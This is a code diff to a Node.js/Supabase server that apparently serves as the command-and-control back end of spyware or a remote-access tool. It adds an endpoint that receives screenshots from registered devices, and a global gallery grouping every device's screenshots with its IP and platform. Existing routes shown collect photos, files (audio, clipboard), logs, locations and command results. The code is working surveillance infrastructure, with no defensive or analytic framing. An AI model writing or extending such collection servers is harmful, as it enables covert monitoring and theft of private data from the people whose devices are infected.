@@ -86,6 +86,7 @@ module.exports = async (req, res) => {
     <div class="endpoints">
         <div><span class="highlight">POST</span> /api/register — Register device</div>
         <div><span class="highlight">POST</span> /api/photo — Upload photo</div>
+        <div><span class="highlight">POST</span> /api/screenshot — Upload screenshot</div>
         <div><span class="highlight">POST</span> /api/upload-file — Upload file</div>
         <div><span class="highlight">POST</span> /api/log — Add log</div>
         <div><span class="highlight">POST</span> /api/location — Add location</div>
@@ -95,7 +96,9 @@ module.exports = async (req, res) => {
         <div><span class="highlight">GET</span> /api/device-details?deviceId=xxx — Full details</div>
         <div><span class="highlight">GET</span> /api/photos?deviceId=xxx — Get photos (JSON)</div>
         <div><span class="highlight">GET</span> /api/photos-gallery?deviceId=xxx — Photo gallery (HTML, per device)</div>
-        <div><span class="highlight">GET</span> /api/photos-global — Global gallery (HTML, all devices)</div>
+        <div><span class="highlight">GET</span> /api/photos-global — Global photo gallery (HTML)</div>
+        <div><span class="highlight">GET</span> /api/screenshots?deviceId=xxx — Get screenshots (JSON)</div>
+        <div><span class="highlight">GET</span> /api/screenshots-global — Global screenshot gallery (HTML)</div>
         <div><span class="highlight">GET</span> /api/logs?deviceId=xxx — Get logs</div>
         <div><span class="highlight">GET</span> /api/locations?deviceId=xxx — Get locations</div>
         <div><span class="highlight">GET</span> /api/health — JSON health check</div>
@@ -126,7 +129,7 @@ module.exports = async (req, res) => {
             },
             supabase: { status: '⏳', error: null, deviceCount: 0 },
             bucket: { exists: false, buckets: [] },
-            tables: { devices: '⏳', photos: '⏳', logs: '⏳', locations: '⏳', heartbeats: '⏳', files: '⏳' },
+            tables: { devices: '⏳', photos: '⏳', logs: '⏳', locations: '⏳', heartbeats: '⏳', files: '⏳', screenshots: '⏳' },
             sample: { count: 0, devices: [] },
             recent: { photo: null, log: null, location: null }
         };
@@ -151,7 +154,7 @@ module.exports = async (req, res) => {
         }
 
         if (supabase && results.supabase.status === '✅') {
-            const tableNames = ['devices', 'photos', 'logs', 'locations', 'heartbeats', 'files'];
+            const tableNames = ['devices', 'photos', 'logs', 'locations', 'heartbeats', 'files', 'screenshots'];
             for (const table of tableNames) {
                 try {
                     const { error } = await supabase.from(table).select('count', { count: 'exact', head: true });
@@ -401,6 +404,7 @@ module.exports = async (req, res) => {
         <div style="display:flex;flex-wrap:wrap;gap:4px 16px;padding:8px 0;font-size:13px;color:#4a6a7a;font-family:'Courier New',monospace;">
             <div><span style="color:#88ccff;">POST</span> /api/register</div>
             <div><span style="color:#88ccff;">POST</span> /api/photo</div>
+            <div><span style="color:#88ccff;">POST</span> /api/screenshot</div>
             <div><span style="color:#88ccff;">POST</span> /api/upload-file</div>
             <div><span style="color:#88ccff;">POST</span> /api/log</div>
             <div><span style="color:#88ccff;">POST</span> /api/location</div>
@@ -411,6 +415,8 @@ module.exports = async (req, res) => {
             <div><span style="color:#6fcf97;">GET</span> /api/photos?deviceId=xxx</div>
             <div><span style="color:#6fcf97;">GET</span> /api/photos-gallery?deviceId=xxx</div>
             <div><span style="color:#6fcf97;">GET</span> /api/photos-global</div>
+            <div><span style="color:#6fcf97;">GET</span> /api/screenshots?deviceId=xxx</div>
+            <div><span style="color:#6fcf97;">GET</span> /api/screenshots-global</div>
             <div><span style="color:#6fcf97;">GET</span> /api/logs?deviceId=xxx</div>
             <div><span style="color:#6fcf97;">GET</span> /api/locations?deviceId=xxx</div>
             <div><span style="color:#6fcf97;">GET</span> /api/health</div>
@@ -511,6 +517,39 @@ module.exports = async (req, res) => {
     }
 
     // ============================================================
+    //  UPLOAD SCREENSHOT
+    // ============================================================
+    if (path === '/api/screenshot' && req.method === 'POST') {
+        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
+        const { deviceId, image, timestamp, notes } = req.body || {};
+        if (!deviceId || !image) return res.status(400).json({ error: 'Missing deviceId or image' });
+        try {
+            let storagePath = null, fileUrl = null;
+            try {
+                const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
+                const ext = image.match(/^data:image\/(\w+);/)?.[1] || 'png';
+                const fileName = `screenshot_${deviceId}_${Date.now()}.${ext}`;
+                const { error: uploadError } = await supabase.storage.from('screenshots').upload(fileName, Buffer.from(base64Data, 'base64'), { contentType: `image/${ext}`, cacheControl: '3600' });
+                if (!uploadError) {
+                    storagePath = fileName;
+                    const { data: urlData } = supabase.storage.from('screenshots').getPublicUrl(fileName);
+                    fileUrl = urlData?.publicUrl || null;
+                }
+            } catch (e) { console.error('Screenshot storage error:', e); }
+            const { error: dbError } = await supabase.from('screenshots').insert([{
+                device_id: deviceId,
+                timestamp: timestamp || Date.now(),
+                storage_path: storagePath,
+                file_url: fileUrl,
+                notes: notes || ''
+            }]);
+            if (dbError) return res.status(500).json({ error: dbError.message });
+            await supabase.from('devices').update({ last_seen: Date.now() }).eq('id', deviceId);
+            return res.json({ success: true, storagePath, fileUrl });
+        } catch (e) { return res.status(500).json({ error: e.message }); }
+    }
+
+    // ============================================================
     //  UPLOAD FILE (screenshot, audio, clipboard)
     // ============================================================
     if (path === '/api/upload-file' && req.method === 'POST') {
@@ -593,13 +632,14 @@ module.exports = async (req, res) => {
         if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
         const deviceId = url.searchParams.get('deviceId');
         if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
-        const [commands, results, logs, photos, files, locations] = await Promise.all([
+        const [commands, results, logs, photos, files, locations, screenshots] = await Promise.all([
             supabase.from('commands').select('*').eq('device_id', deviceId).order('sent_at', { ascending: false }).limit(50),
             supabase.from('results').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(50),
             supabase.from('logs').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100),
             supabase.from('photos').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20),
             supabase.from('files').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20),
-            supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100)
+            supabase.from('locations').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(100),
+            supabase.from('screenshots').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false }).limit(20)
         ]);
         return res.json({
             commands: commands.data || [],
@@ -607,7 +647,8 @@ module.exports = async (req, res) => {
             logs: logs.data || [],
             photos: photos.data || [],
             files: files.data || [],
-            locations: locations.data || []
+            locations: locations.data || [],
+            screenshots: screenshots.data || []
         });
     }
 
@@ -850,7 +891,7 @@ module.exports = async (req, res) => {
     if (path === '/api/photos-global' && req.method === 'GET') {
         if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
 
-        // Fetch all photos with device info (IP, platform)
+        // Fetch all photos with device info
         const { data: photos, error } = await supabase
             .from('photos')
             .select('*, devices(ip, platform)')
@@ -1097,6 +1138,287 @@ module.exports = async (req, res) => {
                 <img src="${url}" alt="Photo" onclick="openLightbox('${url}')" loading="lazy" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22180%22%3E%3Crect fill=%22%231a1a2e%22 width=%22200%22 height=%22180%22/%3E%3Ctext x=%2250%%22 y=%2250%%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%234a6a7a%22 font-family=%22sans-serif%22 font-size=%2214%22%3E⚠️%3C/text%3E%3C/svg%3E'">
                 <div class="info">
                     <span class="camera">📷 ${cam}</span>
+                    <span class="time">${time}</span>
+                </div>
+            </div>`;
+                }
+                html += `
+        </div>
+    </div>`;
+            }
+        }
+
+        html += `
+    <div class="credit">
+        Made with ❤️ by <span>AJ</span>
+    </div>
+</div>
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+    <img id="lightboxImg" src="" alt="Full view">
+</div>
+<script>
+    function openLightbox(url) {
+        document.getElementById('lightboxImg').src = url;
+        document.getElementById('lightbox').classList.add('open');
+    }
+    function closeLightbox() {
+        document.getElementById('lightbox').classList.remove('open');
+    }
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') closeLightbox();
+    });
+</script>
+</body>
+</html>`;
+
+        return res.setHeader('Content-Type', 'text/html; charset=utf-8').status(200).send(html);
+    }
+
+    // ============================================================
+    //  GET SCREENSHOTS (JSON)
+    // ============================================================
+    if (path === '/api/screenshots' && req.method === 'GET') {
+        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
+        const deviceId = url.searchParams.get('deviceId');
+        if (!deviceId) return res.status(400).json({ error: 'Missing deviceId' });
+        const { data, error } = await supabase.from('screenshots').select('*').eq('device_id', deviceId).order('timestamp', { ascending: false });
+        if (error) return res.status(500).json({ error: error.message });
+        return res.json(data);
+    }
+
+    // ============================================================
+    //  GLOBAL SCREENSHOT GALLERY – all devices (HTML)
+    // ============================================================
+    if (path === '/api/screenshots-global' && req.method === 'GET') {
+        if (!supabase) return res.status(500).json({ error: 'Supabase not configured' });
+
+        const { data: shots, error } = await supabase
+            .from('screenshots')
+            .select('*, devices(ip, platform)')
+            .order('timestamp', { ascending: false });
+
+        if (error) return res.status(500).json({ error: error.message });
+
+        const enriched = shots.map(s => ({
+            ...s,
+            publicUrl: s.file_url || '',
+            deviceIp: s.devices?.ip || 'unknown',
+            devicePlatform: s.devices?.platform || 'unknown'
+        }));
+
+        const groups = {};
+        enriched.forEach(s => {
+            const key = s.device_id;
+            if (!groups[key]) groups[key] = [];
+            groups[key].push(s);
+        });
+
+        let html = `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Screenshot Gallery</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a12;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            padding: 24px;
+            min-height: 100vh;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 28px;
+            padding: 16px 24px;
+            background: rgba(20,20,31,0.5);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            border: 1px solid rgba(42,42,68,0.3);
+        }
+        .header h1 {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #f7971e, #ffd200);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .header .back-btn {
+            padding: 8px 20px;
+            border-radius: 60px;
+            border: 1px solid rgba(42,42,68,0.3);
+            background: rgba(42,42,68,0.4);
+            color: #e0e0e0;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+        .header .back-btn:hover {
+            border-color: #f7971e;
+            background: rgba(58,58,90,0.8);
+        }
+        .header .count {
+            color: #4a6a7a;
+            font-size: 14px;
+        }
+        .group {
+            margin-bottom: 40px;
+        }
+        .group-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 20px;
+            background: rgba(20,20,31,0.4);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            border: 1px solid rgba(42,42,68,0.2);
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+        }
+        .group-header .device-id {
+            font-family: 'Courier New', monospace;
+            color: #88ccff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        .group-header .device-meta {
+            color: #4a6a7a;
+            font-size: 13px;
+            margin-left: auto;
+        }
+        .group-header .shot-count {
+            background: rgba(42,42,68,0.3);
+            padding: 2px 14px;
+            border-radius: 30px;
+            font-size: 12px;
+            color: #f7971e;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 12px;
+        }
+        .shot-card {
+            background: rgba(20,20,31,0.5);
+            backdrop-filter: blur(20px);
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid rgba(42,42,68,0.3);
+            transition: all 0.3s ease;
+        }
+        .shot-card:hover {
+            border-color: rgba(247,151,30,0.3);
+            transform: translateY(-4px);
+            box-shadow: 0 12px 36px rgba(0,0,0,0.5);
+        }
+        .shot-card img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+            cursor: pointer;
+        }
+        .shot-card .info {
+            padding: 8px 12px;
+            font-size: 11px;
+            color: #8a8aaa;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 4px;
+        }
+        .shot-card .info .time {
+            color: #4a6a7a;
+        }
+        .no-shots {
+            text-align: center;
+            padding: 60px 20px;
+            color: #4a6a7a;
+            font-size: 18px;
+        }
+        .lightbox {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.92);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            cursor: pointer;
+        }
+        .lightbox.open { display: flex; }
+        .lightbox img {
+            max-width: 90%;
+            max-height: 90%;
+            object-fit: contain;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+        }
+        .credit {
+            text-align: center;
+            color: #4a6a7a;
+            font-size: 11px;
+            margin-top: 32px;
+            border-top: 1px solid rgba(42,42,68,0.2);
+            padding-top: 16px;
+        }
+        .credit span { color: #f7971e; font-weight: 600; }
+        @media (max-width: 600px) {
+            .gallery { grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); }
+            .shot-card img { height: 140px; }
+            .group-header { flex-wrap: wrap; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🖥️ Global Screenshot Gallery</h1>
+        <div>
+            <span class="count">${enriched.length} screenshots total</span>
+            <a href="javascript:history.back()" class="back-btn">← Back</a>
+        </div>
+    </div>`;
+
+        if (enriched.length === 0) {
+            html += `<div class="no-shots">📷 No screenshots have been uploaded yet.</div>`;
+        } else {
+            const groupKeys = Object.keys(groups);
+            for (const deviceId of groupKeys) {
+                const items = groups[deviceId];
+                const first = items[0];
+                const ip = first.deviceIp || 'unknown';
+                const platform = first.devicePlatform || 'unknown';
+                html += `
+    <div class="group">
+        <div class="group-header">
+            <span class="device-id">📱 ${deviceId}</span>
+            <span class="device-meta">${ip} · ${platform}</span>
+            <span class="shot-count">${items.length} screenshots</span>
+        </div>
+        <div class="gallery">`;
+                for (const s of items) {
+                    const url = s.publicUrl || '#';
+                    const time = new Date(s.timestamp).toLocaleString();
+                    html += `
+            <div class="shot-card">
+                <img src="${url}" alt="Screenshot" onclick="openLightbox('${url}')" loading="lazy" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22180%22%3E%3Crect fill=%22%231a1a2e%22 width=%22200%22 height=%22180%22/%3E%3Ctext x=%2250%%22 y=%2250%%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22%234a6a7a%22 font-family=%22sans-serif%22 font-size=%2214%22%3E⚠️%3C/text%3E%3C/svg%3E'">
+                <div class="info">
                     <span class="time">${time}</span>
                 </div>
             </div>`;
